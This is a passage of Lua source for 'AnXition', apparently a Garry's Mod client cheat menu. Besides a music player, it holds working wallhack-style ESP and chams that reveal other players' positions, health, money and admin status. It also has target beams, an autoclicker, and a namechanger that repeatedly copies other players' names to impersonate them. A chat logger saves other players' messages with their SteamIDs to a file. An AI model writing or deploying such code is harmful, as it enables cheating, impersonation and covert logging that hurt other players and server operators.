	CreateButton ( "Mute Game", Musicplayerframe, true, Musicplayerframe:GetWide()-250, 200, 150, 30, "Toggle mute/unmuting game sound.", notable, function() Mutegame() end )
	CreateButton ( "Voicechat", Musicplayerframe, true, Musicplayerframe:GetWide()-250, 250, 150, 30, "Toggle voicechat", notable, function() Voicetoggle() end )
	CreateButton ( "Stop", Musicplayerframe, true, Musicplayerframe:GetWide()-250, 325, 150, 30, "Stop playing Music", notable, function() stopsong() end )	
	CreateButton ( "Back", Musicplayerframe, true, Musicplayerframe:GetWide()/2-25, Musicplayerframe:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() Musicplayerframe:Close() end )
	CreateButton ( "Exit", Musicplayerframe, true, Musicplayerframe:GetWide()-50, 0, 50, 30, "Exit", notable, function() Musicplayerframe:Close() opened = false end )
	if frameopened then
		CloseFrame()
		frameopened = false
	end
	
ScrollList = vgui.Create( "DPanelList", Musicplayerframe )
ScrollList:SetPos( 50,100 )
ScrollList:SetSize( 400, 250 )
ScrollList:SetSpacing( 0 ) 
ScrollList:EnableHorizontal( false )
ScrollList:EnableVerticalScrollbar( true ) 

Scrollframe = vgui.Create("DFrame")  -- A collapsible category
Scrollframe:SetPos( 50,100 ) --Setting its position on the Derma panel
Scrollframe:SetDraggable( false )
Scrollframe:ShowCloseButton( false )
Scrollframe:SetParent(Musicplayerframe)
Scrollframe:SetTitle( "" )
Scrollframe:SetSize( 400, 1000 + namelist ) -- Setting the size of the sheet
Scrollframe:SetText("")
Scrollframe.Paint = function()
	draw.RoundedBox ( 0, 0, 0, Scrollframe:GetWide(), Scrollframe:GetTall(), tblack )
	
	namelist = 0
	for k,v in pairs(Musicnames) do
			draw.SimpleTextOutlined ( v, "Info", 5, -15 + namelist, Color(200,200,200), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			surface.SetDrawColor(red)
			surface.DrawLine ( 0, 10+namelist, Scrollframe:GetWide(), 10+namelist )			
			namelist = namelist + 50
	end
end
	linklist = 0
	for k,v in pairs(Musiclinks) do
		CreateButton ( "Play", Scrollframe, true, Scrollframe:GetWide()-75, -30 + linklist, 50, 30, "Play song.", notable, function() playsong (v) end )
			linklist = linklist + 50
	end		

 ScrollList:AddItem(Scrollframe)

 
end

function Mutegame()
	if !mutinggame then
		ply:ConCommand("volume 0")
		mutinggame = true
		ChatPrint("Game sound muted", red)
	elseif mutinggame then
		mutinggame = false
		ply:ConCommand("volume 0.75")
		ChatPrint("Game sound unmuted", red)
	end
end

function Voicetoggle()
	if !voicechatting then
		voicechatting = true
		ply:ConCommand("+voicerecord")
	elseif voicechatting then
		voicechatting = false
		ply:ConCommand("-voicerecord")
	end
end

function stopsong()
	return true
end

function playsong (url)

	stopsong()

	local playpanel = vgui.Create( "DFrame" ) 
	playpanel:SetPos( ScrW()*2,ScrH()*2 ) 
	playpanel:SetSize( 1, 1 ) 
	playpanel:SetVisible( false )
	
	function stopsong ()
		playpanel:Close()
		function stopsong ()
			return true
		end
	end

	local HTMLPanel = vgui.Create("HTML")
	HTMLPanel:SetParent(playpanel)
	HTMLPanel:SetPos(1 ,1)
	HTMLPanel:SetSize(1, 1)
	HTMLPanel:OpenURL(url)
	ChatPrint( "Song Is now playing!", red)
	
end

function Addsong()
	local Addsongframe = vgui.Create("DFrame")
		Addsongframe:SetSize(ScrW()/4, ScrH()/4)
		Addsongframe:SetPos(ScrW()/4+ScrW()/8, ScrH()/4+ScrH()/8)
		Addsongframe:ShowCloseButton( false )
		Addsongframe:MakePopup()
		Addsongframe:SetTitle( "" )
		Addsongframe:SetDraggable( false )
		Addsongframe.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, Addsongframe:GetWide(), Addsongframe:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, Addsongframe:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, Addsongframe:GetWide(), Addsongframe:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, Addsongframe:GetWide(), Addsongframe:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", Addsongframe:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Add a song.", "Info", Addsongframe:GetWide()/2, 40, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "URL", "Info", 50, 85, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Name", "Info", 50, 110, Color(200,200,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			
		end		
	CreateTabButton ( "", Addsongframe, true, 30, 75, 50, 20, "Insert URL here", trans, function() gui.OpenURL( "http://en.wikipedia.org/wiki/Uniform_resource_locator" ) end )		
	CreateTabButton ( "", Addsongframe, true, 30, 100, 50, 20, "Insert Name here", trans, function() end )		
	CreateButton ( "Add", Addsongframe, true, Addsongframe:GetWide()/2-50, 150, 100, 30, "Add the song.", notable, function() AddCustomSong () end )	
	CreateButton ( "Back", Addsongframe, true, Addsongframe:GetWide()/2-25, Addsongframe:GetTall()-40, 50, 30, "Go back to the Music Player.", notable, function() MusicPlayer() Addsongframe:Close() end )
	
	local URLBox = vgui.Create( "DTextEntry", Addsongframe )
	URLBox:SetPos( Addsongframe:GetWide()/4,75 )
	URLBox:SetTall( 20 )
	URLBox:SetWide( 200 )
	URLBox:SetEnterAllowed( true )

	local NameBox = vgui.Create( "DTextEntry", Addsongframe )
	NameBox:SetPos( Addsongframe:GetWide()/4,100 )
	NameBox:SetTall( 20 )
	NameBox:SetWide( 200 )
	NameBox:SetEnterAllowed( true )	
	
function AddCustomSong ()
	if (not table.HasValue(Musiclinks, URLBox:GetValue())) then
		file.Append("AnXition/music/links.txt","%"..URLBox:GetValue())
		Musiclinks = string.Explode("%",(file.Read("AnXition/music/links.txt")))
		file.Append("AnXition/music/names.txt","%"..NameBox:GetValue())
		Musicnames = string.Explode("%",(file.Read("AnXition/music/names.txt")))		
		ChatPrint (NameBox:GetValue().." Has been added to the playlist!", red)
	else
		ChatPrint ("This song has already been added!", red)
	end
end


	
	
end

function ClearMusicList()
file.Write("AnXition/music/names.txt")
file.Write("AnXition/music/links.txt")
Musicnames = string.Explode("%",(file.Read("AnXition/music/names.txt")))
Musiclinks = string.Explode("%",(file.Read("AnXition/music/links.txt")))	
end

function Credits()
	local Credits = vgui.Create("DFrame")
		Credits:SetSize(ScrW()/2, ScrH()/2)
		Credits:SetPos(ScrW()/4, ScrH()/4)
		Credits:ShowCloseButton( false )
		Credits:MakePopup()
		Credits:SetTitle( "" )
		Credits:SetDraggable( false )
		Credits.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, Credits:GetWide(), Credits:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, Credits:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, Credits:GetWide(), Credits:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, Credits:GetWide(), Credits:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", Credits:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Menu and scripts made by Freedom.", "Info", Credits:GetWide()/2, 50, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
			draw.SimpleTextOutlined ( "Special thanks to FlameZ for being awesome.", "Info", Credits:GetWide()/2, 90, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )				
			draw.SimpleTextOutlined ( "Thanks to Snow Boi for creating :0- Face.", "Info", Credits:GetWide()/2, 110, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )	
			
		end
	CreateButton ( "Back", Credits, true, Credits:GetWide()/2-25, Credits:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() Credits:Close() end )
	CloseFrame()
end

--== ESP ==--
function EntityMenu()
	local EntityFrame = vgui.Create("DFrame")
		EntityFrame:SetSize(ScrW()/2, ScrH()/2)
		EntityFrame:SetPos(ScrW()/4, ScrH()/4)
		EntityFrame:ShowCloseButton( false )
		EntityFrame:MakePopup()
		EntityFrame:SetTitle( "" )
		EntityFrame:SetDraggable( false )
		EntityFrame.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, EntityFrame:GetWide(), EntityFrame:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, EntityFrame:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, EntityFrame:GetWide(), EntityFrame:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, EntityFrame:GetWide(), EntityFrame:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", EntityFrame:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
		end
ScrollList = vgui.Create( "DPanelList", EntityFrame )
ScrollList:SetPos( 50,100 )
ScrollList:SetSize( 400, 250 )
ScrollList:SetSpacing( 0 ) 
ScrollList:EnableHorizontal( false )
ScrollList:EnableVerticalScrollbar( true ) 
entitylist = 0
Scrollframe = vgui.Create("DFrame")  
Scrollframe:SetPos( 50,100 )
Scrollframe:SetDraggable( false )
Scrollframe:ShowCloseButton( false )
Scrollframe:SetParent(EntityFrame)
Scrollframe:SetTitle( "" )
Scrollframe:SetSize( 400, 1000 + entitylist ) 
Scrollframe:SetText("")
Scrollframe.Paint = function()
	draw.RoundedBox ( 0, 0, 0, Scrollframe:GetWide(), Scrollframe:GetTall(), tblack )
	
			entitylist = 0
			for k,v in pairs(ESPEnts) do
				draw.SimpleTextOutlined ( v, "Info", 5, 35 + entitylist, Color(200,200,200), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
				surface.SetDrawColor(red)
				surface.DrawLine ( 0, 10+entitylist, Scrollframe:GetWide(), 10+entitylist )	
				entitylist = entitylist + 50
			end
end
			
	ScrollList:AddItem(Scrollframe)
		CreateButton ( "Toggle", EntityFrame, true, EntityFrame:GetWide()-250, 100, 200, 30, "Toggle Entity ESP", notable, function() ToggleEntityESP() end )
		CreateButton ( "Add Entity", EntityFrame, true, EntityFrame:GetWide()-250, 150, 200, 30, "Add a Entity", notable, function() ND() end )
		CreateButton ( "Clear", EntityFrame, true, EntityFrame:GetWide()-250, 200, 200, 30, "Clear list", notable, function() file.Write("AnXition/ESP/Ents.txt") ESPEnts = string.Explode("%",(file.Read("AnXition/ESP/Ents.txt"))) end )		
		CreateButton ( "Back", EntityFrame, true, EntityFrame:GetWide()/2-25, EntityFrame:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() EntityFrame:Close() end )
	CloseFrame()		
end

function ToggleEntityESP()
	if !eesp then
		eesp = true
		Notify("[ESP] Entities On", 5)
		Addhook("HUDPaint", "FEESP", function()
			for k,v in pairs(ents.GetAll()) do
				class = string.Explode("_", v:GetClass())
				if table.HasValue(ESPEnts, v:GetClass()) or table.HasValue(class, "printer") then
					local entityposition = (v:GetPos()+Vector(0,0,20)):ToScreen()
					draw.SimpleTextOutlined ( v:GetClass(), "ESPFont", entityposition.x, entityposition.y, Color( 225,255,0 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
					cam.Start3D(EyePos(),EyeAngles())
					render.SuppressEngineLighting( true )
					render.MaterialOverride( mat )
					render.SetColorModulation( 200,0,0 )
					render.SetBlend(0.3)
					v:DrawModel()
					render.SetBlend(1)
					render.SuppressEngineLighting( false )
					render.MaterialOverride( )
					cam.End3D()		
				end
			end
		end)
	elseif eesp then
		eesp = false
		Notify("[ESP] Entities Off", 5)
		hook.Remove("HUDPaint", "FEESP")
	end
end

function BeamsFrame()
	local BeamFrame = vgui.Create("DFrame")
		BeamFrame:SetSize(ScrW()/4, ScrH()/4)
		BeamFrame:SetPos(ScrW()/8+ScrW()/4, ScrH()/8+ScrH()/4)
		BeamFrame:ShowCloseButton( false )
		BeamFrame:MakePopup()
		BeamFrame:SetTitle( "" )
		BeamFrame:SetDraggable( false )
		BeamFrame.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, BeamFrame:GetWide(), BeamFrame:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, BeamFrame:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, BeamFrame:GetWide(), BeamFrame:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, BeamFrame:GetWide(), BeamFrame:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", BeamFrame:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )	
		end
	CreateButton ( "Toggle", BeamFrame, true, BeamFrame:GetWide()/2-100, 50, 200, 30, "Toggle Beams", notable, function() Beams () end )	
	CreateButton ( "Clear", BeamFrame, true, BeamFrame:GetWide()/2-100, 100, 200, 30, "Clear Targeted Players", notable, function() file.Write("AnXition/ESP/Beams.txt") Beamplayers = string.Explode("%",(file.Read("AnXition/ESP/Beams.txt"))) ChatPrint("[ESP] Beam list cleared.", red) end )			
	CreateButton ( "Back", BeamFrame, true, BeamFrame:GetWide()/2-25, BeamFrame:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() BeamFrame:Close() end )
	CloseFrame()
end

function Beams()
	if !beams then
		beams = true
		Beamplayers	= string.Explode("%",(file.Read("AnXition/ESP/Beams.txt")))
		Notify("[ESP] Beams On", 5)	
		Addhook("HUDPaint", "beams", function()
			for k,v in pairs(player.GetAll()) do
				if table.HasValue(Beamplayers, v:SteamID()) then
					cam.Start3D(EyePos(),EyeAngles())
					render.SetMaterial( Material("cable/redlaser"))
					render.SetColorModulation(0,255,0)	
					render.DrawBeam(LocalPlayer():LocalToWorld(v:OBBCenter()+Vector(30,0,0)),v:LocalToWorld(v:OBBCenter()),0.7,0.7,0.7)
					cam.End3D()					
				end
			end
		end)
	elseif beams then
		beams = false
		Notify("[ESP] Beams Off", 5)	
		hook.Remove("HUDPaint", "beams")
	end
end


function AddBeamPlayer(v)
	if !table.HasValue(Beamplayers, v:SteamID()) then
		file.Append("AnXition/ESP/Beams.txt","%"..v:SteamID())
		Beamplayers = string.Explode("%",(file.Read("AnXition/ESP/Beams.txt")))
		ChatPrint("[ESP] Player '"..v:GetName().."' added!", red)
	elseif table.HasValue(Beamplayers, v:SteamID()) then
		ChatPrint("[ESP] Player already added!", red)
	end
end

function ESP()
	if !esp then
		esp = true
		Notify("[ESP] Info On", 5)
		Addhook("HUDPaint", "FESP", function()
			for k,v in pairs(player.GetAll()) do
				if v != ply and v:Alive() then
					local playerposition = (v:GetPos()+Vector(0,0,80)):ToScreen()
					if v:IsAdmin() or v:IsSuperAdmin() then groupcol = Color( 255, 100, 100 ) else groupcol = Color( 100,100,255 ) 
					end
					group = ("["..v:GetUserGroup().."]") or "user"
					if group=="[user]" then group=" "
					end
						money = (v.DarkRPVars and v.DarkRPVars.money) or "Unkown"
						if !money then money = "" end
						draw.SimpleTextOutlined ( ""..group.."", "ESPFont", playerposition.x, playerposition.y-15, groupcol, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
						draw.SimpleTextOutlined ( v:GetName(), "ESPFont", playerposition.x, playerposition.y, Color( 200,200,200 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
						if table.HasValue(members, v:SteamID()) then
							draw.SimpleTextOutlined ("MEMBER", "ESPFont", playerposition.x, playerposition.y-25, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
						elseif table.HasValue(moderators, v:SteamID()) then
							draw.SimpleTextOutlined ("MODERATOR", "ESPFont", playerposition.x, playerposition.y-27.5, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
						elseif table.HasValue(officers, v:SteamID()) then
							draw.SimpleTextOutlined ("OFFICER", "ESPFont", playerposition.x, playerposition.y-27.5, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )							
						elseif table.HasValue(owner, v:SteamID()) then
							draw.SimpleTextOutlined ("OWNER", "ESPFont", playerposition.x, playerposition.y-27.5, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )
						elseif table.HasValue(blacklist, v:SteamID()) then
							draw.SimpleTextOutlined ("BLACKLISTED", "ESPFont", playerposition.x, playerposition.y-27.5, black, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, white )							
						end
						if v:GetFriendStatus()=="friend" and !table.HasValue(members, v:SteamID()) and !table.HasValue(moderators, v:SteamID()) and !table.HasValue(officers, v:SteamID()) and !table.HasValue(owner, v:SteamID()) then
							draw.SimpleTextOutlined ("Friend", "ESPFont", playerposition.x, playerposition.y-27.5, green, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )					
						end
						if ply:GetPos():Distance(v:GetPos()) < 1000 and v:Health() <= 100 then
							draw.RoundedBox ( 0, playerposition.x-38.5, playerposition.y+9, 77, 7, black )
							draw.RoundedBox ( 0, playerposition.x-37.5, playerposition.y+10, 75/100*v:Health(), 5, green )
							draw.SimpleTextOutlined ("$"..money, "ESPFont", playerposition.x, playerposition.y+25, Color( 200,200,200 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )					
						elseif ply:GetPos():Distance(v:GetPos()) < 1000 and v:Health() > 100 then
							draw.RoundedBox ( 0, playerposition.x-38.5, playerposition.y+9, 77, 7, black )
							draw.RoundedBox ( 0, playerposition.x-37.5, playerposition.y+10, 75/100*100, 5, blue )
							draw.SimpleTextOutlined ("$"..money, "ESPFont", playerposition.x, playerposition.y+25, Color( 200,200,200 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, black )		
						end
				end
			end
		end)
	elseif esp then
		esp = false
		Notify("[ESP] Info Off", 5)
		hook.Remove("HUDPaint", "FESP")
	end
end

function Chams()
	if !chams then
		chamsc = green
		chams = true
		Notify("[ESP] Chams On", 5)
		Addhook("HUDPaint", "Chams", function()
			for k,v in pairs(player.GetAll()) do
				if v != ply and !Visible( v ) and v:Alive() then
					cam.Start3D(EyePos(),EyeAngles())
					render.SuppressEngineLighting( true )
					render.MaterialOverride( mat1 )
					render.SetColorModulation( ( team.GetColor(v:Team()).r * ( 5 / 255 ) ), ( team.GetColor(v:Team()).g * ( 1 / 255 ) ), ( team.GetColor(v:Team()).b * ( 1 / 255 ) ) )
					v:DrawModel()
						if (IsValid(v:GetActiveWeapon())) then
							v:GetActiveWeapon():DrawModel()
						end
					render.SuppressEngineLighting( false )
					render.MaterialOverride( )
					cam.End3D()
				end
			end
		end)
	elseif chams then
		chamsc = red
		chams = false
		Notify("[ESP] Chams Off", 5)
		hook.Remove("HUDPaint", "Chams")
	end
end

function StartESP()
	esp = false
	chams = false
	eesp = false
	
	ToggleEntityESP()
	ESP()
	Chams()
end

--== Aimbot ==--

--== ChatLog ==--
function ChatLog()
	if !chatlogging then
		chatlogging = true
		Notify("[LOG] ChatLog On", 5)
	elseif chatlogging then
		chatlogging = false
		Notify("[LOG] ChatLog Off", 5)
	end
end

function ChatLogging( ply, strText, bTeamOnly, bPlayerIsDead )
	local tab = {}
	if ( IsValid( ply ) ) then
		table.insert( tab, ply:GetName() )
	else
		table.insert( tab, "Console" )
	end
	table.insert( tab, Color( 255, 255, 255 ) )
	table.insert( tab, ": "..strText )
	if chatlogging then
		file.Append("AnXition/logger/chat.txt",  ply:GetName().." ["..ply:SteamID().."]  -  "..strText.."          "..tostring( os.date() ).."\n")
	end
end
Addhook("OnPlayerChat", "OnPlayerChat",ChatLogging)

function StartLog()
	chatlogging = false
	ChatLog()
end
--== MISC ==--
function SpamMenu()
	local SpamFrame = vgui.Create("DFrame")
		SpamFrame:SetSize(ScrW()/4, ScrH()/4)
		SpamFrame:SetPos(ScrW()/8+ScrW()/4, ScrH()/8+ScrH()/4)
		SpamFrame:ShowCloseButton( false )
		SpamFrame:MakePopup()
		SpamFrame:SetTitle( "" )
		SpamFrame:SetDraggable( false )
		SpamFrame.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, SpamFrame:GetWide(), SpamFrame:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, SpamFrame:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, SpamFrame:GetWide(), SpamFrame:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, SpamFrame:GetWide(), SpamFrame:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", SpamFrame:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )	
		end
	CreateButton ( "Toggle", SpamFrame, true, SpamFrame:GetWide()/2-100, 50, 200, 30, "Toggle Beams", notable, function() Beams () end )	
	CreateButton ( "Clear", SpamFrame, true, SpamFrame:GetWide()/2-100, 100, 200, 30, "Clear Targeted Players", notable, function() file.Write("AnXition/ESP/Beams.txt") Beamplayers = string.Explode("%",(file.Read("AnXition/ESP/Beams.txt"))) ChatPrint("[ESP] Beam list cleared.", red) end )			
	CreateButton ( "Back", SpamFrame, true, SpamFrame:GetWide()/2-25, SpamFrame:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() SpamFrame:Close() end )
	CloseFrame()
end

function AutoClick()
	if !autoclick then
		autoclick = "left"
		Notify("[MISC] AutoClick(LEFT) On", 5)
		Addhook("Think", "Autoclick", function()
			if input.IsMouseDown(MOUSE_LEFT) then
				if !clicked then
					clicked = true
					ply:ConCommand("+attack")
				elseif clicked then
					clicked = false
					ply:ConCommand("-attack")
				end
			end
		end)
	elseif autoclick == "left" then
		autoclick = "right"
		Notify("[MISC] AutoClick(RIGHT) On", 5)
		Addhook("Think", "Autoclick", function()
			if input.IsMouseDown(MOUSE_RIGHT) then
				if !clicked then
					clicked = true
					ply:ConCommand("+attack2")
				elseif clicked then
					clicked = false
					ply:ConCommand("-attack2")
				end
			end
		end)		
	elseif autoclick == "right" then
		autoclick = false
		Notify("[MISC] AutoClick Off", 5)
		hook.Remove("Think", "Autoclick")
		ply:ConCommand("-attack2")
		ply:ConCommand("-attack")
	end
end

function pick(Table)
return Table[math.random(0,table.getn(Table))]
end

function Namechanger ()
	playernames={}
	a = 0
	for k,v in pairs(player.GetAll()) do
		if v:IsPlayer() and v!=LocalPlayer() then
			playernames[a]=v:Nick()
				a=a+1
		end
	end
	
	if !namechanging then
		namechanging = true
		Notify("[MISC] Namechanger On", 5)
		timer.Create("namechange", 6, 0, function() ply:ConCommand("say /rpname "..pick(playernames).."   ") end)
	elseif namechanging then
		namechanging = false	
		Notify("[MISC] Namechanger Off", 5)
		timer.Destroy("namechange")
	end
end

function Getknifeammo()
	if !gettingammo then
		gettingammo = true
		Notify("[MISC] KnifeSup On", 5)
		timer.Create("getammo", 1.4, 0, function()
			RunConsoleCommand( "use", "weapon_real_cs_knife" )
			ply:ConCommand("say /drop")
			Addhook("Think", "usespam", function()
				if !use then
					use = true
					ply:ConCommand("+use")
				elseif use then
					use = false
					ply:ConCommand("-use")
				end
			end)
			timer.Simple(1.3, function()
				hook.Remove("Think", "usespam")
				ply:ConCommand("-use")
				RunConsoleCommand( "use", "weapon_real_cs_knife" )
			end)
		end)
	elseif gettingammo then
		timer.Destroy("getammo")
		gettingammo = false
		Notify("[MISC] KnifeSup Off", 5)
	end
end

function Animation()
	local AnimationFrame = vgui.Create("DFrame")
		AnimationFrame:SetSize(ScrW()/4, ScrH()/4)
		AnimationFrame:SetPos(ScrW()/8+ScrW()/4, ScrH()/8+ScrH()/4)
		AnimationFrame:ShowCloseButton( false )
		AnimationFrame:MakePopup()
		AnimationFrame:SetTitle( "" )
		AnimationFrame:SetDraggable( false )
		AnimationFrame.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, AnimationFrame:GetWide(), AnimationFrame:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, AnimationFrame:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, AnimationFrame:GetWide(), AnimationFrame:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, AnimationFrame:GetWide(), AnimationFrame:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", AnimationFrame:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )	
		end
	CreateButton ( "Flex", AnimationFrame, true, AnimationFrame:GetWide()/2-152.5, 40, 150, 30, "Start Flex animation.", notable, function() timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1616") end) Notify("[MISC] You started Flexing.", 5)  end )
	CreateButton ( "Muscle", AnimationFrame, true, AnimationFrame:GetWide()/2-152.5, 75, 150, 30, "Start Muscle animation.", notable, function() timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1617") end) Notify("[MISC] You started Muscle-ing.", 5)  end )
	CreateButton ( "Laugh", AnimationFrame, true, AnimationFrame:GetWide()/2-152.5, 110, 150, 30, "Start Laugh animation.", notable, function() timer.Create("animating", 3, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1618") end) Notify("[MISC] You started Laughing.", 5)  end )
	CreateButton ( "Nod", AnimationFrame, true, AnimationFrame:GetWide()/2+2.5, 40, 150, 30, "Start Nod animation.", notable, function() timer.Create("animating", 2, 0, function()  RunConsoleCommand("_DarkRP_DoAnimation", "1613") end) Notify("[MISC] You started Nodding.", 5)  end )
	CreateButton ( "Bow", AnimationFrame, true, AnimationFrame:GetWide()/2+2.5, 75, 150, 30, "Start Bow animation.", notable, function() timer.Create("animating", 3, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1612") end) Notify("[MISC] You started Bowing.", 5)  end )
	CreateButton ( "Thumbs Up", AnimationFrame, true, AnimationFrame:GetWide()/2+2.5, 110, 150, 30, "Start Thumbs Up animation.", notable, function() timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1610") end) Notify("[MISC] You started Thumbing Up.", 5)  end )	
	
	CreateButton ( "Stop", AnimationFrame, true, AnimationFrame:GetWide()/2-50, 150, 100, 30, "Stop animating.", notable, function() timer.Destroy("animating") Notify("[MISC] You Stopped animating", 5) end )			
	CreateButton ( "Back", AnimationFrame, true, AnimationFrame:GetWide()/2-25, AnimationFrame:GetTall()-40, 50, 30, "Go back to the main menu", notable, function() Menu() AnimationFrame:Close() end )
	CloseFrame()
end

function RepeatMenu()
	local RepeatFrame = vgui.Create("DFrame")
		RepeatFrame:SetSize(ScrW()/2, ScrH()/2)
		RepeatFrame:SetPos(ScrW()/4, ScrH()/4)
		RepeatFrame:ShowCloseButton( false )
		RepeatFrame:MakePopup()
		RepeatFrame:SetTitle( "" )
		RepeatFrame:SetDraggable( false )
		repeatlist = 0
		RepeatFrame.Paint = function () 
			draw.RoundedBox ( 0, 0, 0, RepeatFrame:GetWide(), RepeatFrame:GetTall(), tblack )
			draw.RoundedBox ( 0, 0, 0, RepeatFrame:GetWide(), 30, tblack )
			surface.SetDrawColor (red)
			surface.DrawOutlinedRect ( 0, 0, RepeatFrame:GetWide(), RepeatFrame:GetTall() )	
			surface.DrawOutlinedRect ( 0, 30, RepeatFrame:GetWide(), RepeatFrame:GetTall() )	
			draw.SimpleTextOutlined ( "AnXition", "Logo", RepeatFrame:GetWide()/2, 15, flashycolor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
		end
		
ScrollList = vgui.Create( "DPanelList", RepeatFrame )
ScrollList:SetPos( 50,100 )
ScrollList:SetSize( 400, 250 )
ScrollList:SetSpacing( 0 ) 
ScrollList:EnableHorizontal( false )
ScrollList:EnableVerticalScrollbar( true ) 

Scrollframe = vgui.Create("DFrame")  
Scrollframe:SetPos( 50,100 )
Scrollframe:SetDraggable( false )
Scrollframe:ShowCloseButton( false )
Scrollframe:SetParent(RepeatFrame)
Scrollframe:SetTitle( "" )
Scrollframe:SetSize( 400, 1000 + repeatlist ) 
Scrollframe:SetText("")
Scrollframe.Paint = function()
	draw.RoundedBox ( 0, 0, 0, Scrollframe:GetWide(), Scrollframe:GetTall(), tblack )
	
			repeatlist = 0
			for k,v in pairs(player.GetAll()) do
				if table.HasValue(Repeatplayers, v:SteamID()) then
					draw.SimpleTextOutlined ( v:GetName(), "Info", 5, 35 + repeatlist, Color(200,200,200), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 15,15,15 ) )
					surface.SetDrawColor(red)
					surface.DrawLine ( 0, 10+repeatlist, Scrollframe:GetWide(), 10+repeatlist )	
					repeatlist = repeatlist + 50
				end
			end
end
			
	ScrollList:AddItem(Scrollframe)
	
	CreateButton ( "Toggle", RepeatFrame, true, RepeatFrame:GetWide()-250, 100, 200, 30, "Toggle Repeater", notable, function() ToggleRepeat() end )
